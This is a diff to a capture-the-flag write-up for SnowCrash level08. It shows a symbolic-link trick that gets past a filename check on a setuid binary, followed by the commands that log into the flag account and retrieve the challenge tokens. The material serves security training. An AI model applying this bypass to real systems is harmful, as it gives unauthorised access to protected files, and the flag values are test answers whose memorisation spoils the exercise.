@@ -101,15 +101,27 @@ This command creates a symbolic link named `/tmp/level08flag` that points to the
 
   </details>
 
+And we got our flag for level08.
+
 ```
 level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/level08flag
 level08@SnowCrash:~$ ./level08 /tmp/level08flag
 quif5eloekouj29ke0vouxean
 ```
 
+This time, we need to get our token with su flag08
+
+```
+level08@SnowCrash:~$ su flag08
+Password:
+Don't forget to launch getflag !
+flag08@SnowCrash:~$ getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+```
+
 And we got our password 😘
 
 <details>
   <summary> Password </summary>
-  quif5eloekouj29ke0vouxean
+  25749xKZ8L7DkSCwJkT9dyv6f
   </details>
